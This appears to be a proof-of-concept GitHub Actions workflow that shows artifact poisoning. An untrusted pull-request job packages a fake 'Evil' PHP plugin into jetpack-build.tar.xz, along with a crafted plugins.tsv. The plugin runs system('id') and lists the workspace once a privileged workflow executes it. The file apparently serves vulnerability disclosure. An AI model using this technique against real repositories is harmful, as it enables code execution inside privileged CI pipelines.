name: Build
on:
  pull_request:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Craft attacker-controlled build artifact
        run: |
          mkdir -p build/mirror
          printf 'poc\tmirror\tevil\n' > build/plugins.tsv
          cat > build/mirror/evil.php <<'PHP'
          <?php
          // Plugin Name: Evil
          // Description: Attacker-supplied plugin shipped inside jetpack-build.tar.xz
          echo "=== PWNED: attacker artifact code executed in the privileged workflow ===\n";
          system('id');
          system('echo "--- workspace context ---"; pwd; ls -la');
          PHP
          tar -cJf jetpack-build.tar.xz build
      - uses: actions/upload-artifact@v4
        with:
          name: jetpack-build.tar.xz
          path: jetpack-build.tar.xz
      - uses: actions/upload-artifact@v4
        with:
          name: plugins.tsv
          path: build/plugins.tsv
